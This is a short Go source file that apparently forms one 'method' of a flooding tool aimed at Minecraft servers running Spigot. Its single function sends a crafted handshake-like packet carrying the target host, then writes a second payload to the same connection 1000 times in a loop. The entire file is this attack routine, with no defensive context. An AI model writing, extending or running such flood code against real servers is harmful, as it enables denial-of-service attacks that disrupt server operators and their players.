package methods

import (
	"fmt"
	"net"
)

// Spigot1 is for spigot o_O
func Spigot1(data *Data, out net.Conn) bool {
	if data.bytes == nil {
		data.supplyBytes(makeBytes(15, 0, 47, 9, data.Host, 99, 224, 1))
	}

	_, err := out.Write(data.bytes)

	if err != nil {
		return true
	}

	fmt.Println("sent")

	for n := 0; n < 1000; n++ {
		out.Write(data.minorBytes)
	}

	return false
}
